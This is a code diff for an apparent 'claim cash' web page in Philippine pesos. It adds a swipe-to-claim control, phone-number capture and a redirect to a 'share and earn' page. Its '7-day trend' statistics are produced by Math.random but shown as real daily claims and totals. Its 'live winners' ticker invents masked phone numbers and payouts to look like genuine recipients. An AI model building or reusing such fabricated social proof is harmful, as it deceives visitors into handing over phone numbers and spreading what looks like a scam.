+                window.addEventListener('mousemove', function(e) {
+                    if (!isDragging || swipeCompleted) return;
+                    e.preventDefault();
+                    var moveX = e.clientX - startX;
+                    var newLeft = currentLeft + moveX;
+                    newLeft = Math.max(0, Math.min(newLeft, maxLeft));
+                    swipeIcon.style.left = newLeft + 'px';
+                    updateFireTrailPosition(newLeft, maxLeft);
+                });
+                
+                window.addEventListener('mouseup', function(e) {
+                    if (!isDragging || swipeCompleted) return;
+                    isDragging = false;
+                    swipeIcon.style.cursor = 'grab';
+                    stopFireTrail();
+                    
+                    var finalLeft = parseInt(swipeIcon.style.left) || 0;
+                    
+                    if (finalLeft >= maxLeft - 10) {
+                        completeSwipe();
+                    } else {
+                        swipeIcon.style.left = '0px';
+                        if (swipeFireTrail) swipeFireTrail.style.width = '0%';
+                    }
+                });
+            }
+            
+            // ========== 7-DAY TREND DASHBOARD ==========
+            function loadTrendData() {
+                if (!db) return;
+                
+                // Generate 7-day data
+                var days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
+                var today = new Date();
+                var dayOfWeek = today.getDay();
+                
+                // Generate random data
+                var dayData = [];
+                var maxVal = 0;
+                
+                for (var i = 0; i < 7; i++) {
+                    var dayIndex = (dayOfWeek - 6 + i + 7) % 7;
+                    var val = Math.floor(Math.random() * 30) + 5;
+                    dayData.push({
+                        label: days[dayIndex],
+                        value: val,
+                        isToday: (i === 6)
+                    });
+                    if (val > maxVal) maxVal = val;
+                }
+                
+                // Render bars
+                var graphEl = document.getElementById('trendGraph');
+                if (!graphEl) return;
+                
+                graphEl.innerHTML = '';
+                
+                dayData.forEach(function(item) {
+                    var wrapper = document.createElement('div');
+                    wrapper.className = 'trend-bar-wrapper';
+                    
+                    var bar = document.createElement('div');
+                    bar.className = 'trend-bar' + (item.isToday ? ' today' : '');
+                    bar.style.height = '0%';
+                    
+                    wrapper.appendChild(bar);
+                    graphEl.appendChild(wrapper);
+                    
+                    // Animate height
+                    setTimeout(function() {
+                        bar.style.height = ((item.value / maxVal) * 100) + '%';
+                    }, 100);
+                });
+                
+                // Update stats
+                var todayClaims = dayData[6].value * 3;
+                var totalClaimed = todayClaims * 500;
+                
+                var todayEl = document.getElementById('todayClaims');
+                var totalEl = document.getElementById('totalClaimed');
+                
+                if (todayEl) todayEl.textContent = todayClaims;
+                if (totalEl) totalEl.textContent = '₱' + totalClaimed.toLocaleString();
+            }
+            
+            // ========== LIVE WINNERS TICKER ==========
+            function updateTickerWithTransition(phoneNumber, amount, action) {
+                if (!winnerEntry) return;
+                
+                winnerEntry.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+                winnerEntry.style.opacity = '0';
+                winnerEntry.style.transform = 'translateY(-5px)';
+                
+                setTimeout(function() {
+                    winnerEntry.innerHTML = '<i class="fas fa-bolt"></i> ' + 
+                        phoneNumber + ' ' + action + ' ' +
+                        '<span class="ticker-amount">+₱' + amount.toLocaleString() + '</span>';
+                    winnerEntry.style.opacity = '1';
+                    winnerEntry.style.transform = 'translateY(0)';
+                }, 300);
+            }
+            
+            function startTicker() {
+                var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
+                
+                function generateRandomAmount() {
+                    var rand = Math.random() * 100;
+                    if (rand < 85) return 500;
+                    if (rand < 95) return 1000;
+                    if (rand < 98) return 1500;
+                    return 2000;
+                }
+                
+                function generateWinner() {
+                    var randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+                    var randomSuffix = Math.floor(1000 + Math.random() * 9000);
+                    var phoneNumber = randomPrefix + '***' + randomSuffix;
+                    var amount = generateRandomAmount();
+                    var actions = ['received', 'received', 'received', 'withdraw'];
+                    var action = actions[Math.floor(Math.random() * actions.length)];
+                    return { phoneNumber: phoneNumber, amount: amount, action: action };
+                }
+                
+                var initial = generateWinner();
+                if (winnerEntry) {
+                    winnerEntry.innerHTML = '<i class="fas fa-bolt"></i> ' + 
+                        initial.phoneNumber + ' ' + initial.action + ' ' +
+                        '<span class="ticker-amount">+₱' + initial.amount.toLocaleString() + '</span>';
+                }
+                
+                setInterval(function() {
+                    var winner = generateWinner();
+                    updateTickerWithTransition(winner.phoneNumber, winner.amount, winner.action);
+                }, 4800);
+            }
+            
+            // ========== MODAL FUNCTIONS ==========
+            function closeModal() {
+                if (modalOverlay) modalOverlay.style.display = 'none';
+            }
+            
+            // ========== INITIALIZE ==========
+            function init() {
+                initFirebase();
+                initSwipe();
+                startTicker();
                 loadTrendData();
+                
+                // Refresh trend every 30 seconds
+                setInterval(loadTrendData, 30000);
+                
+                if (modalOverlay) {
+                    modalOverlay.addEventListener('click', function(e) {
+                        if (e.target === modalOverlay) closeModal();
+                    });
+                }
+                
+                if (userPhoneInput) {
+                    // Auto-format
+                    userPhoneInput.addEventListener('input', function() {
+                        var value = this.value.replace(/\D/g, '');
+                        if (value.length > 10) value = value.substring(0, 10);
+                        
+                        var formatted = value;
+                        if (value.length > 6) {
+                            formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
+                        } else if (value.length > 3) {
+                            formatted = value.substring(0, 3) + ' ' + value.substring(3);
+                        }
+                        this.value = formatted;
+                    });
+                    
+                    // Enter key
+                    userPhoneInput.addEventListener('keypress', function(e) {
+                        if (e.key === 'Enter') processStep1();
+                    });
+                }
+                
+                console.log('✅ Index page initialized');
             }
-
+            
+            // ========== EXPORT ==========
+            window.processStep1 = processStep1;
+            window.closeModal = closeModal;
+            
+            // ========== AUTO-REDIRECT IF ALREADY LOGGED IN ==========
+            (function() {
+                var existingUserPhone = localStorage.getItem("userPhone");
+                if (existingUserPhone && existingUserPhone !== 'null' && existingUserPhone !== 'undefined' && existingUserPhone.length > 5) {
+                    console.log('Existing user detected. Redirecting...');
+                    window.location.href = "share_and_earn.html";
+                }
+            })();
+            
+            // ========== START ==========
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', init);
+            } else {
+                init();
+            }
+            
         })();
     </script>
-
 </body>
 </html>
